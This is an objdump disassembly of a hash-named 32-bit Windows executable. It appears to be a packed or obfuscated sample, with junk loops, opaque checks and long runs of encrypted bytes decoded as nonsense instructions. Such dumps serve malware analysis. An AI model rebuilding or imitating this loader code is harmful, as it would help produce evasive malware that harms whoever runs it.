
0a7941b27b45b1038fd3cd26e0b2daff0f3a5367a28ec63fa7464c0db0a05fbd.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	mov    DWORD PTR ds:0x434429,0x7186
  401015:	mov    DWORD PTR [ebp-0x20],eax
  401018:	mov    ecx,DWORD PTR [ebp-0x20]
  40101b:	mov    DWORD PTR ds:0x43439e,0x6cee
  401025:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40102c:	mov    DWORD PTR ds:0x4326f0,0x6120
  401036:	cmp    ecx,eax
  401038:	mov    DWORD PTR ds:0x43441d,0x7018
  401042:	jne    0x4019f7
  401048:	mov    ax,WORD PTR [ebp-0x24]
  40104c:	push   esi
  40104d:	mov    DWORD PTR ds:0x4326fc,0x1b
  401057:	cmp    DWORD PTR ds:0x4326fc,0x0
  40105e:	je     0x40108e
  401064:	cmp    DWORD PTR ds:0x4326fc,0x22
  40106b:	jne    0x40107c
  401071:	push   0x432dc2
  401076:	call   DWORD PTR ds:0x4329b2
  40107c:	mov    ecx,DWORD PTR ds:0x4326fc
  401082:	dec    ecx
  401083:	mov    DWORD PTR ds:0x4326fc,ecx
  401089:	jmp    0x401057
  40108e:	mov    ecx,0x8a3e
  401093:	mov    DWORD PTR ds:0x43438a,0x48c
  40109d:	xor    ax,cx
  4010a0:	add    DWORD PTR ds:0x434419,0x61ba
  4010aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4010ad:	xor    esi,DWORD PTR ds:0x434396
  4010b3:	push   edi
  4010b4:	mov    DWORD PTR ds:0x43437a,0x1c
  4010be:	cmp    DWORD PTR ds:0x43437a,0x0
  4010c5:	je     0x401105
  4010cb:	cmp    DWORD PTR ds:0x43437a,0x25
  4010d2:	jne    0x4010f3
  4010d8:	push   0x38d9
  4010dd:	push   DWORD PTR [ebp-0xc]
  4010e0:	push   0x7b63
  4010e5:	push   0x618f
  4010ea:	push   DWORD PTR [ebp-0x28]
  4010ed:	call   DWORD PTR ds:0x4329b6
  4010f3:	mov    edi,DWORD PTR ds:0x43437a
  4010f9:	dec    edi
  4010fa:	mov    DWORD PTR ds:0x43437a,edi
  401100:	jmp    0x4010be
  401105:	mov    edi,0x3b04
  40110a:	xor    DWORD PTR ds:0x432700,edx
  401110:	add    ax,di
  401113:	add    DWORD PTR ds:0x43439a,0xf3f
  40111d:	movzx  eax,ax
  401120:	add    DWORD PTR ds:0x4326f4,edi
  401126:	not    eax
  401128:	or     esi,DWORD PTR ds:0x434411
  40112e:	and    eax,DWORD PTR [ecx]
  401130:	movzx  ecx,WORD PTR ds:0x432dc2
  401137:	xor    DWORD PTR ds:0x432de6,ecx
  40113d:	mov    ecx,DWORD PTR [ebp+0x8]
  401140:	sub    DWORD PTR ds:0x434425,ecx
  401146:	mov    DWORD PTR [ecx],eax
  401148:	adc    ecx,0x6b0b
  40114e:	mov    ecx,0x7510855
  401153:	sbb    esi,DWORD PTR ds:0x432dda
  401159:	mov    esi,0x32729c
  40115e:	sbb    DWORD PTR ds:0x434425,0x3918
  401168:	push   ebx
  401169:	or     DWORD PTR ds:0x4343a2,ebx
  40116f:	mov    ax,WORD PTR [ebp-0x24]
  401173:	dec    ebx
  401174:	movzx  eax,ax
  401177:	mov    DWORD PTR [ebp-0x38],eax
  40117a:	sub    eax,0x1c8b
  40117f:	mov    eax,DWORD PTR [ebp+0x8]
  401182:	mov    DWORD PTR [ebp-0x28],eax
  401185:	xor    eax,eax
  401187:	or     eax,DWORD PTR ds:0x432dce
  40118d:	add    DWORD PTR ds:0x434376,eax
  401193:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  40119a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4011a1:	mov    eax,0x9577
  4011a6:	or     DWORD PTR ds:0x43439a,0x2325
  4011b0:	mov    WORD PTR [ebp-0x4],ax
  4011b4:	movzx  ebx,BYTE PTR ds:0x4326f4
  4011bb:	or     DWORD PTR ds:0x4326f0,ebx
  4011c1:	lea    eax,[ebp-0x30]
  4011c4:	mov    DWORD PTR [ebp-0x34],eax
  4011c7:	mov    eax,DWORD PTR [ebp-0x28]
  4011ca:	mov    DWORD PTR [ebp-0x2c],eax
  4011cd:	add    DWORD PTR ds:0x434419,0x693e
  4011d7:	lea    eax,[ebp-0x18]
  4011da:	and    DWORD PTR ds:0x43436a,0x0
  4011e4:	jmp    0x4011f6
  4011e9:	mov    ebx,DWORD PTR ds:0x43436a
  4011ef:	inc    ebx
  4011f0:	mov    DWORD PTR ds:0x43436a,ebx
  4011f6:	cmp    DWORD PTR ds:0x43436a,0x18
  4011fd:	jae    0x40123a
  401203:	cmp    DWORD PTR ds:0x43436a,0x8
  40120a:	jne    0x40121b
  401210:	push   0x7a50
  401215:	call   DWORD PTR ds:0x4329ba
  40121b:	cmp    DWORD PTR ds:0x43436a,0x7
  401222:	jne    0x401235
  401228:	mov    ebx,DWORD PTR ds:0x43436a
  40122e:	inc    ebx
  40122f:	mov    DWORD PTR ds:0x43436a,ebx
  401235:	jmp    0x4011e9
  40123a:	mov    DWORD PTR [ebp-0x1c],eax
  40123d:	mov    eax,DWORD PTR [ebp-0x1c]
  401240:	mov    DWORD PTR [eax],0xf89f2da9
  401246:	mov    eax,DWORD PTR [ebp-0x14]
  401249:	mov    ebx,DWORD PTR [ebp-0x8]
  40124c:	and    DWORD PTR ds:0x434415,0x66ce
  401256:	xor    eax,ecx
  401258:	xor    ebx,ecx
  40125a:	and    DWORD PTR ds:0x434419,0x3a0f
  401264:	xor    edx,edx
  401266:	and    DWORD PTR ds:0x432de6,0x4326f0
  401270:	add    eax,esi
  401272:	mov    DWORD PTR ds:0x43441d,0x1b71
  40127c:	add    ebx,esi
  40127e:	div    ebx
  401280:	mov    DWORD PTR ds:0x434376,0x5747
  40128a:	mov    edx,DWORD PTR [ebp-0x2c]
  40128d:	mov    DWORD PTR ds:0x4326f4,0x57da
  401297:	cmp    eax,DWORD PTR [edx]
  401299:	mov    DWORD PTR ds:0x434382,0x6b31
  4012a3:	je     0x4019ca
  4012a9:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4012b0:	lea    eax,[ebp-0xc]
  4012b3:	sbb    edx,DWORD PTR ds:0x432dca
  4012b9:	mov    DWORD PTR [ebp-0x10],eax
  4012bc:	mov    eax,DWORD PTR [ebp-0x10]
  4012bf:	jmp    0x401447
  4012c4:	popa   
  4012c5:	xchg   BYTE PTR ds:0x6151e949,cl
  4012cb:	mov    dh,0x3f
  4012cd:	mov    ah,0xd5
  4012cf:	mov    dl,0x1c
  4012d1:	mov    al,BYTE PTR [esi*8+0x70707070]
  4012d8:	in     eax,0x7f
  4012da:	jo     0x40134c
  4012dc:	rcl    bh,0x3d
  4012df:	aad    0x39
  4012e1:	ror    edi,cl
  4012e3:	rol    eax,1
  4012e5:	pop    es
  4012e6:	push   es
  4012e7:	add    ecx,DWORD PTR [edi]
  4012e9:	jge    0x4012ed
  4012eb:	rdpmc  
  4012ed:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  4012f1:	adc    bl,BYTE PTR [edi]
  4012f3:	mov    ecx,0xddb7025a
  4012f8:	add    bh,ch
  4012fa:	mov    ebp,0x8003c8db
  4012ff:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401305:	lods   eax,DWORD PTR ds:[esi]
  401306:	sar    BYTE PTR [eax+0x6fee581f],1
  40130c:	or     edx,DWORD PTR [ecx]
  40130e:	sahf   
  40130f:	jp     0x4012d9
  401311:	inc    edx
  401312:	lods   al,BYTE PTR ds:[esi]
  401313:	push   ebx
  401314:	sub    eax,0xad3ec6d1
  401319:	mov    WORD PTR [ebx-0x3b],?
  40131c:	stos   DWORD PTR es:[edi],eax
  40131d:	js     0x4012e5
  40131f:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401325:	jmp    0x401359
  401327:	mov    ebp,ecx
  401329:	dec    edi
  40132a:	fcomp  DWORD PTR [eax-0x656800bf]
  401330:	pop    es
  401331:	test   eax,0xed4dbddc
  401336:	sub    BYTE PTR [ebp+0x23],dl
  401339:	mov    ah,0xec
  40133b:	pusha  
  40133c:	nop
  40133d:	mov    esi,0x94c3117b
  401342:	and    esi,edx
  401344:	jmp    0x401396
  401346:	(bad)  
  401347:	out    0xba,al
  401349:	repnz in al,dx
  40134b:	xchg   esp,eax
  40134c:	xor    edi,ecx
  40134e:	jbe    0x4013b5
  401350:	xlat   BYTE PTR ds:[ebx]
  401351:	and    cl,ch
  401353:	add    al,0xd9
  401355:	adc    DWORD PTR [ecx-0x68],edx
  401358:	xor    eax,0x7a616f03
  40135d:	or     dh,BYTE PTR [ecx]
  40135f:	fld    QWORD PTR [eax+0x7f752a56]
  401365:	xor    BYTE PTR [edi+0xba8db0c],cl
  40136b:	pop    ebx
  40136c:	push   ebp
  40136d:	(bad)  
  40136f:	or     ebx,edx
  401371:	pop    esi
  401372:	fstp   DWORD PTR [ecx]
  401374:	jno    0x401306
  401376:	mov    eax,0x2b15374b
  40137b:	ja     0x4013a6
  40137d:	sbb    al,0xd3
  40137f:	xor    BYTE PTR [edi-0x16],cl
  401382:	int    0xa6
  401384:	rol    BYTE PTR [edi],0x29
  401387:	adc    DWORD PTR [edx-0x3d14e3c2],0x71
  40138e:	jl     0x4013f9
  401390:	outs   dx,BYTE PTR ds:[esi]
  401391:	ret    0x2afa
  401394:	mov    cs,WORD PTR [ebp-0x92dc981]
  40139a:	xor    BYTE PTR [ebp-0x2cee3c9a],0x5d
  4013a1:	adc    edx,ecx
  4013a3:	sbb    eax,DWORD PTR [ebx]
  4013a5:	push   es
  4013a6:	mov    edx,0x802e2c56
  4013ab:	je     0x40137e
  4013ad:	popf   
  4013ae:	and    ch,BYTE PTR [edi+edx*8+0x24c9b48]
  4013b5:	mov    edx,0x30f9c7c7
  4013ba:	mov    cs,WORD PTR ds:0x207ff65
  4013c0:	(bad)  
  4013c1:	mov    al,ds:0xe0d53e1f
  4013c6:	ja     0x4013e6
  4013c8:	out    dx,eax
  4013c9:	push   edi
  4013ca:	test   eax,0xfe4d2b7a
  4013cf:	dec    esp
  4013d0:	ins    DWORD PTR es:[edi],dx
  4013d1:	call   0x551:0xe590fead
  4013d8:	out    0x9d,eax
  4013da:	xor    eax,DWORD PTR [eax]
  4013dc:	cli    
  4013dd:	cwde   
  4013de:	test   eax,0x9c667556
  4013e3:	clc    
  4013e4:	jae    0x4013e2
  4013e6:	(bad)  
  4013e7:	(bad)  [edi-0x48fe1dc3]
  4013ed:	sub    ah,BYTE PTR [ebx-0x73]
  4013f0:	jno    0x4013ce
  4013f2:	test   BYTE PTR [ebx+eax*2],al
  4013f5:	outs   dx,BYTE PTR ds:[esi]
  4013f6:	cmp    ebx,DWORD PTR [edi]
  4013f8:	sub    al,0xde
  4013fa:	pop    esi
  4013fb:	leave  
  4013fc:	and    ah,BYTE PTR [edi]
  4013fe:	cwde   
  4013ff:	jecxz  0x40146a
  401401:	mov    esi,0x86efcaff
  401406:	pop    es
  401407:	mov    cl,0xb0
  401409:	xchg   ecx,eax
  40140a:	sub    edi,DWORD PTR [edi+eiz*8-0x75e866e4]
  401411:	cli    
  401412:	jmp    0xe930f8bc
  401417:	adc    al,0x29
  401419:	hlt    
  40141a:	test   eax,0xe62f0bf1
  40141f:	loopne 0x4013c2
  401421:	cld    
  401422:	jns    0x4014a2
  401424:	in     eax,dx
  401425:	inc    edi
  401426:	mov    eax,ds:0x65f4edb7
  40142b:	stos   DWORD PTR es:[edi],eax
  40142c:	lea    edx,[ecx-0x46e46d5a]
  401432:	sub    al,BYTE PTR ds:0xea327b46
  401438:	dec    esi
  401439:	inc    edi
  40143a:	dec    edi
  40143b:	(bad)  
  40143c:	sub    esp,ebx
  40143e:	add    al,0xec
  401440:	xchg   ebp,eax
  401441:	bndstx [eax],bnd1
  401444:	xchg   esi,eax
  401445:	adc    dh,BYTE PTR [ecx-0x75]
  401448:	adc    BYTE PTR [ecx-0x2e],ch
  40144b:	in     al,dx
  40144c:	test   eax,0x1089f89e
  401451:	mov    eax,DWORD PTR [ebp-0xc]
  401454:	cmp    eax,0x742b26d4
  401459:	jmp    0x4015e1
  40145e:	push   ds
  40145f:	fcmovnb st,st(2)
  401461:	mov    edx,0x5ba661c1
  401466:	xlat   BYTE PTR ds:[ebx]
  401467:	les    ecx,FWORD PTR [esi]
  401469:	test   DWORD PTR ds:0xe5209ea0,edx
  40146f:	jg     0x4014e1
  401471:	jo     0x401458
  401473:	jg     0x4014e5
  401475:	jo     0x40140f
  401477:	popa   
  401478:	or     BYTE PTR [edi+0x10],cl
  40147b:	and    bl,cl
  40147d:	cmp    al,0x90
  40147f:	bound  ecx,QWORD PTR [edx+0x37f96dc1]
  401485:	shr    DWORD PTR [esi+0x50],0x48
  401489:	repnz mov bp,0xdc11
  40148e:	ror    DWORD PTR [bp+0x3],1
  401492:	pushf  
  401493:	add    DWORD PTR [eax],edx
  401495:	inc    ecx
  401496:	(bad)  
  401497:	scas   al,BYTE PTR es:[edi]
  401498:	fsub   DWORD PTR [ecx]
  40149a:	xchg   edi,eax
  40149b:	adc    eax,0x92b3bfc5
  4014a0:	sahf   
  4014a1:	shl    DWORD PTR [edx],0xab
  4014a4:	xchg   edi,eax
  4014a5:	xchg   ebp,eax
  4014a6:	xor    al,0xa2
  4014a8:	jmp    FWORD PTR [eax-0x5f61d055]
  4014ae:	xchg   ebp,eax
  4014af:	ins    DWORD PTR es:[edi],dx
  4014b0:	sbb    esi,ecx
  4014b2:	adc    ebp,DWORD PTR [ecx-0x48078c50]
  4014b8:	xor    al,0x1b
  4014ba:	in     eax,dx
  4014bb:	cmp    eax,0x204065c2
  4014c0:	(bad)  
  4014c1:	(bad)  
  4014c2:	sbb    WORD PTR [ecx+0x28e840a9],cx
  4014c9:	xor    bh,BYTE PTR [edx-0x1465e93d]
  4014cf:	fcmovnb st,st(4)
  4014d1:	int    0xd1
  4014d3:	mov    al,0x5d
  4014d5:	les    eax,FWORD PTR [eax-0x23]
  4014d8:	mov    eax,ds:0xe89d37f3
  4014dd:	clc    
  4014de:	xchg   ecx,eax
  4014df:	adc    eax,0xda57dfff
  4014e4:	fsin   
  4014e6:	mov    ds:0x5918a350,al
  4014eb:	cmp    BYTE PTR [eax+0x4b],cl
  4014ee:	in     eax,dx
  4014ef:	vsubsd xmm1,xmm2,xmm3
  4014f3:	mov    eax,0x2178f41a
  4014f8:	adc    BYTE PTR [ecx+0x77],cl
  4014fb:	leave  
  4014fc:	xor    eax,0x72426087
  401501:	mov    ebp,0xf6f41673
  401506:	ins    BYTE PTR es:[edi],dx
  401507:	(bad)  
  401508:	mov    ch,0x42
  40150a:	aaa    
  40150b:	xor    DWORD PTR [edx+esi*4+0x5674c5ad],eax
  401512:	jb     0x40149a
  401514:	data16 (bad) 
  401517:	inc    ebp
  401518:	(bad)  
  401519:	and    cl,BYTE PTR [edi]
  40151b:	sub    DWORD PTR [ebp+0x76],esp
  40151e:	clc    
  40151f:	mov    ah,BYTE PTR [esi]
  401521:	fst    QWORD PTR [ecx+edx*1-0x4a707329]
  401528:	aad    0x0
  40152a:	rol    BYTE PTR [ebx+0x5a9c087b],0xa7
  401531:	scas   eax,DWORD PTR es:[edi]
  401532:	add    ax,bx
  401535:	clc    
  401536:	mov    bl,0x13
  401538:	mov    esp,0x4b227531
  40153d:	ins    DWORD PTR es:[edi],dx
  40153e:	iret   
  40153f:	shl    DWORD PTR [ebx-0x1c],0x47
  401543:	xchg   BYTE PTR cs:[edi],al
  401546:	call   0x4c86:0xac9390a3
  40154d:	sar    dh,1
  40154f:	dec    esp
  401550:	outs   dx,DWORD PTR fs:[esi]
  401552:	pop    ebp
  401553:	out    dx,al
  401554:	lods   eax,DWORD PTR ds:[esi]
  401555:	xchg   ebx,eax
  401556:	xor    BYTE PTR [ecx],0x91
  401559:	fdivr  QWORD PTR [ecx-0xff3b755]
  40155f:	fcmovnb st,st(2)
  401561:	pop    edx
  401562:	(bad)  
  401563:	pop    ss
  401564:	sub    BYTE PTR [edx],dl
  401566:	outs   dx,DWORD PTR ds:[esi]
  401567:	stos   DWORD PTR es:[edi],eax
  401568:	call   0xfe0a49ea
  40156d:	and    DWORD PTR [edi],0x49
  401570:	js     0x401547
  401572:	mov    ebx,0x194dbb3b
  401577:	stos   BYTE PTR es:[edi],al
  401578:	stos   BYTE PTR es:[edi],al
  401579:	or     ch,BYTE PTR [edi+0x63]
  40157c:	cld    
  40157d:	outs   dx,BYTE PTR ds:[esi]
  40157e:	push   edx
  40157f:	sahf   
  401580:	jl     0x4015df
  401582:	leave  
  401583:	push   ebx
  401584:	rol    DWORD PTR [esi-0x46],1
  401587:	jp     0x40153e
  401589:	mov    eax,0x575e8c93
  40158e:	push   esi
  40158f:	xchg   ecx,eax
  401590:	daa    
  401591:	adc    al,0x11
  401593:	lods   al,BYTE PTR ds:[esi]
  401594:	mov    ebx,0xcfce768f
  401599:	and    edi,ebx
  40159b:	ja     0x40156d
  40159d:	ins    BYTE PTR es:[edi],dx
  40159e:	and    ch,ch
  4015a0:	in     eax,dx
  4015a1:	jmp    ebx
  4015a3:	mov    edx,0xfc253f82
  4015a8:	rol    eax,1
  4015aa:	ror    DWORD PTR [edx-0x6658d054],0x1d
  4015b1:	iret   
  4015b2:	mov    cl,0x23
  4015b4:	jo     0x40160e
  4015b6:	les    esp,FWORD PTR ds:0x52e33c07
  4015bc:	repnz xchg esi,eax
  4015be:	fidiv  DWORD PTR [ecx-0x10]
  4015c1:	xchg   ebp,eax
  4015c2:	and    BYTE PTR [edi-0x67],dl
  4015c5:	jae    0x401586
  4015c7:	xor    BYTE PTR [eax+0x7e],0x86
  4015cb:	add    edx,esi
  4015cd:	js     0x4015ed
  4015cf:	or     cl,bl
  4015d1:	xor    DWORD PTR ds:0x1472bc77,eax
  4015d7:	jl     0x401622
  4015d9:	mov    eax,0x629bdbc6
  4015de:	or     eax,0x840f88e1
  4015e3:	push   cs
  4015e4:	add    BYTE PTR [eax],al
  4015e6:	add    BYTE PTR [ebx+0x881e445],cl
  4015ec:	pushf  
  4015ed:	sbb    al,0x75
  4015ef:	pusha  
  4015f0:	jmp    0x4019d9
  4015f5:	mov    eax,DWORD PTR [ebp-0xc]
  4015f8:	add    eax,DWORD PTR [ebp-0x18]
  4015fb:	cmp    eax,0x6cca547d
  401600:	je     0x401614
  401606:	mov    eax,DWORD PTR [ebp-0x10]
  401609:	and    DWORD PTR [eax],0x751c99
  40160f:	jmp    0x4019d9
  401614:	mov    eax,DWORD PTR [ebp-0xc]
  401617:	mov    edx,DWORD PTR [ebp-0x18]
  40161a:	or     eax,edx
  40161c:	cmp    eax,0xfcbf2ffd
  401621:	je     0x401635
  401627:	mov    eax,DWORD PTR [ebp-0x10]
  40162a:	xor    DWORD PTR [eax],0x2650fa8f
  401630:	jmp    0x4019d9
  401635:	mov    ax,WORD PTR [ebp-0x4]
  401639:	mov    edx,0x8a3e
  40163e:	xor    ax,dx
  401641:	mov    edx,DWORD PTR [ebp-0x28]
  401644:	mov    edx,DWORD PTR [edx]
  401646:	add    ax,di
  401649:	cmp    ax,WORD PTR [edx]
  40164c:	je     0x401821
  401652:	mov    eax,DWORD PTR [ebp-0x14]
  401655:	xor    eax,ecx
  401657:	add    eax,esi
  401659:	mov    DWORD PTR [ebp-0x30],eax
  40165c:	mov    eax,DWORD PTR [ebp-0x34]
  40165f:	mov    dx,WORD PTR [ebp-0x38]
  401663:	mov    ebx,0x8a3e
  401668:	xor    dx,bx
  40166b:	mov    ebx,DWORD PTR [ebp-0x8]
  40166e:	add    dx,di
  401671:	jmp    0x4017f9
  401676:	clc    
  401677:	repnz sbb eax,0xa851698d
  40167d:	icebp  
  40167e:	pusha  
  40167f:	xchg   ebx,eax
  401680:	rcl    DWORD PTR [ebx+0x75],1
  401683:	ds mov ecx,ebp
  401686:	dec    edx
  401687:	jle    0x4016f9
  401689:	jo     0x401670
  40168b:	jg     0x4016fd
  40168d:	jo     0x4016f0
  40168f:	scas   al,BYTE PTR es:[edi]
  401690:	adc    BYTE PTR [edi+0x1cd05c46],bl
  401696:	lock push cs
  401698:	push   es
  401699:	mov    eax,ds:0x1f8cbdf9
  40169e:	shr    eax,0xa6
  4016a1:	cld    
  4016a2:	ja     0x401711
  4016a4:	sbb    cl,BYTE PTR [ebx]
  4016a6:	mov    ah,0x34
  4016a8:	cdq    
  4016a9:	adc    edx,esi
  4016ab:	xor    al,BYTE PTR [ebx+0xe]
  4016ae:	cld    
  4016af:	fucomip st,st(2)
  4016b1:	out    dx,al
  4016b2:	rcr    BYTE PTR [edx],cl
  4016b4:	xchg   BYTE PTR [edx+0x60],cl
  4016b7:	pop    esi
  4016b8:	ror    DWORD PTR [ecx+0x3ba313da],cl
  4016be:	imul   ecx,eax,0x2c
  4016c1:	sub    dl,ah
  4016c3:	daa    
  4016c4:	and    esi,DWORD PTR [edx]
  4016c6:	ja     0x40170a
  4016c8:	bound  ecx,QWORD PTR [edx+0x19359e86]
  4016ce:	frstor [eax-0x22705738]
  4016d4:	mov    bl,BYTE PTR [edx+0x19f04840]
  4016da:	arpl   bx,dx
  4016dc:	xor    BYTE PTR [edi-0xc],dh
  4016df:	nop
  4016e0:	aam    0xa8
  4016e2:	pop    esp
  4016e3:	repnz or eax,0x7dccb2be
  4016e9:	mov    cl,0xf2
  4016eb:	fsub   st(4),st
  4016ed:	fdiv   st,st(0)
  4016ef:	or     ecx,DWORD PTR [edx-0x279c79c6]
  4016f5:	test   eax,0x2f7a42d
  4016fa:	push   es
  4016fb:	cmc    
  4016fc:	loope  0x40172f
  4016fe:	cmp    DWORD PTR [ecx+esi*2],eax
  401701:	xor    al,BYTE PTR [edi+0x6b020035]
  401707:	jnp    0x40171e
  401709:	loope  0x4016d5
  40170b:	shl    DWORD PTR [edi+edi*8-0x14],0xcb
  401710:	dec    esi
  401711:	inc    ebx
  401712:	mov    esi,0x20317eea
  401717:	fs adc eax,0x4598c848
  40171d:	and    eax,0x819f6fea
  401722:	leave  
  401723:	int    0xef
  401725:	js     0x4016e3
  401727:	(bad)  
  401728:	mov    eax,0x1b542a7
  40172d:	push   ebp
  40172e:	pop    ss
  40172f:	nop
  401730:	add    ebp,DWORD PTR [esi-0x6643a57d]
  401736:	pop    esp
  401737:	mov    bl,0x18
  401739:	lea    ebp,[ecx-0x4f9cd933]
  40173f:	sbb    ch,dl
  401741:	mov    eax,ds:0xcfefd509
  401746:	cmp    eax,0x6dcb2fc2
  40174b:	and    eax,0x36b430f4
  401750:	ds jg  0x40171d
  401753:	jmp    0x5ef2aef5
  401758:	retf   0x9e16
  40175b:	cmp    dl,BYTE PTR [esi-0x5a]
  40175e:	jl     0x4017d5
  401760:	push   ebx
  401761:	mov    dh,0x84
  401763:	(bad)  
  401764:	lods   al,BYTE PTR ds:[esi]
  401765:	push   0x75
  401767:	(bad)  
  401768:	mov    ebx,0xea7bfddd
  40176d:	adc    eax,0x2ee7ea8b
  401772:	pop    ds
  401773:	(bad)  [ecx+0x61]
  401776:	scas   eax,DWORD PTR es:[edi]
  401777:	mov    ecx,0x2cc1ba0f
  40177c:	ficomp DWORD PTR [eax-0x1a2d7c01]
  401782:	pop    esi
  401783:	cmp    al,0x62
  401785:	daa    
  401786:	repnz lods al,BYTE PTR ds:[esi]
  401788:	(bad)  
  401789:	cmc    
  40178a:	push   edi
  40178b:	fisttp QWORD PTR [edi]
  40178d:	fbstp  TBYTE PTR [edi+0x15]
  401790:	sub    DWORD PTR [ebx],esp
  401792:	or     eax,0x4e15767c
  401797:	push   esp
  401798:	mov    dl,0xb0
  40179a:	sub    al,0xa0
  40179c:	mov    edx,0xb6f2d077
  4017a1:	daa    
  4017a2:	out    dx,eax
  4017a3:	push   esp
  4017a4:	stos   BYTE PTR es:[edi],al
  4017a5:	fwait
  4017a6:	pop    ecx
  4017a7:	xchg   esi,eax
  4017a8:	mov    ds:0xe57b3e0,al
  4017ad:	fisubr WORD PTR [esi-0x29e6668]
  4017b3:	jnp    0x40176d
  4017b5:	int3   
  4017b6:	sub    DWORD PTR [esi],eax
  4017b8:	sub    eax,0xaa9c267
  4017bd:	and    BYTE PTR [esi+0x47f11507],dh
  4017c3:	ja     0x4017d3
  4017c5:	jns    0x40176d
  4017c7:	xor    eax,0x45f71b12
  4017cc:	mov    ch,0xa7
  4017ce:	mov    bh,0x7d
  4017d0:	jge    0x40181b
  4017d2:	in     al,0xe
  4017d4:	mov    esi,0xcf587a14
  4017d9:	test   al,0xfb
  4017db:	dec    edx
  4017dc:	pushf  
  4017dd:	sbb    bh,BYTE PTR [eax+esi*2]
  4017e0:	jns    0x4017ae
  4017e2:	inc    edi
  4017e3:	pop    esi
  4017e4:	dec    eax
  4017e5:	cmp    eax,0xbcc8365a
  4017ea:	test   BYTE PTR [ebp+0x7b2eb424],0xa3
  4017f1:	mov    cl,0x1a
  4017f3:	(bad)  [ebp+ebp*2+0x6c]
  4017f7:	shr    DWORD PTR [edi+ecx*1],1
  4017fa:	mov    bh,0xd2
  4017fc:	xor    ebx,ecx
  4017fe:	lea    edx,[edx+ebx*1+0x32729c]
  401805:	add    DWORD PTR [eax],edx
  401807:	mov    eax,DWORD PTR [ebp-0x2c]
  40180a:	mov    edx,DWORD PTR [ebp-0x8]
  40180d:	mov    ebx,DWORD PTR [ebp-0x30]
  401810:	xor    edx,ecx
  401812:	add    edx,esi
  401814:	imul   edx,ebx
  401817:	sub    DWORD PTR [eax],edx
  401819:	mov    eax,DWORD PTR [ebp-0x14]
  40181c:	jmp    0x4019dc
  401821:	mov    eax,DWORD PTR [ebp-0xc]
  401824:	mov    edx,DWORD PTR [ebp-0x18]
  401827:	jmp    0x4019af
  40182c:	pop    ebx
  40182d:	arpl   di,di
  40182f:	out    dx,eax
  401830:	xchg   ebx,esi
  401832:	imul   esi,DWORD PTR [ebx-0x5d],0x7d
  401836:	jae    0x401839
  401838:	ins    BYTE PTR es:[edi],dx
  401839:	or     DWORD PTR [esi-0xd],ebx
  40183c:	aas    
  40183d:	jl     0x4018af
  40183f:	jo     0x401826
  401841:	jg     0x4018b3
  401843:	jo     0x401858
  401845:	(bad)  
  401846:	fst    DWORD PTR [edi+0xb]
  401849:	xor    al,0xc
  40184b:	xchg   ebx,eax
  40184c:	push   esp
  40184d:	pop    ebx
  40184e:	repnz and bl,BYTE PTR [esi-0x51e29eb8]
  401855:	xor    al,0xaa
  401857:	jb     0x4017f7
  401859:	sti    
  40185a:	add    ah,0xba
  40185d:	pop    ebx
  40185e:	dec    ebx
  40185f:	cmc    
  401860:	mov    bl,dl
  401862:	in     al,dx
  401863:	test   al,0x5b
  401865:	popf   
  401866:	inc    esp
  401867:	or     eax,DWORD PTR [edi+0x66]
  40186a:	out    0x69,eax
  40186c:	retf   
  40186d:	scas   al,BYTE PTR es:[edi]
  40186e:	pop    eax
  40186f:	lods   al,BYTE PTR ds:[esi]
  401870:	jno    0x401892
  401872:	outs   dx,DWORD PTR ds:[esi]
  401873:	addr16 xchg ecx,eax
  401875:	iret   
  401876:	xchg   ecx,eax
  401877:	das    
  401878:	mov    dl,0xeb
  40187a:	mov    al,0xfd
  40187c:	cli    
  40187d:	xor    eax,0xb0551e53
  401882:	sbb    dl,dl
  401884:	rcl    DWORD PTR [ecx*2+0x24b7a3ee],1
  40188b:	es mov ecx,0xb186b0bc
  401891:	lahf   
  401892:	inc    esi
  401893:	aad    0x41
  401895:	addr16 or eax,0x7e2d6d54
  40189b:	jecxz  0x401862
  40189d:	inc    ebp
  40189e:	jo     0x4018d1
  4018a0:	cli    
  4018a1:	push   cs
  4018a2:	fisubr WORD PTR [edx+0x38f35600]
  4018a8:	push   ebx
  4018a9:	jb     0x401893
  4018ab:	lea    esi,[ebx-0x41]
  4018ae:	test   eax,0x33a4b7a6
  4018b3:	mov    ds:0x681a8831,al
  4018b8:	jb     0x4018a7
  4018ba:	scas   al,BYTE PTR es:[edi]
  4018bb:	mov    DWORD PTR [ebx],0x8d6a50c0
  4018c1:	fcmovu st,st(1)
  4018c3:	ret    
  4018c4:	stos   DWORD PTR es:[edi],eax
  4018c5:	fiadd  DWORD PTR [esi-0x74]
  4018c8:	popa   
  4018c9:	sbb    BYTE PTR [esi+0x4acd837e],bh
  4018cf:	pop    ebp
  4018d0:	pop    eax
  4018d1:	push   eax
  4018d2:	ja     0x401904
  4018d4:	stos   DWORD PTR es:[edi],eax
  4018d5:	pusha  
  4018d6:	sbb    eax,0xcad67809
  4018db:	(bad)  
  4018dc:	jne    0x401886
  4018de:	xchg   edx,eax
  4018df:	sbb    esp,DWORD PTR [edi+eiz*4-0x79d70007]
  4018e6:	mov    esp,0xeaeb441
  4018eb:	push   sp
  4018ed:	data16 or dl,bh
  4018f0:	out    0x47,al
  4018f2:	xor    DWORD PTR [esi-0x14],ecx
  4018f5:	sbb    esp,DWORD PTR [ecx+0x67c6b048]
  4018fb:	sub    BYTE PTR [ecx-0x7d01b7dc],dh
  401901:	arpl   WORD PTR [eax-0x1d],ax
  401904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401905:	daa    
  401906:	adc    eax,0x7d7ed1b9
  40190b:	jno    0x40196d
  40190d:	cwde   
  40190e:	mov    ch,0x4c
  401910:	in     eax,0x58
  401912:	je     0x401920
  401914:	or     eax,0xfecfddb7
  401919:	stc    
  40191a:	xor    DWORD PTR [eax],eax
  40191c:	gs mov eax,0xbcd09ad1
  401922:	xchg   esi,eax
  401923:	mov    BYTE PTR [edx-0x37250f60],ah
  401929:	mov    es,WORD PTR [bp+0x21]
  40192d:	cli    
  40192e:	pop    ebx
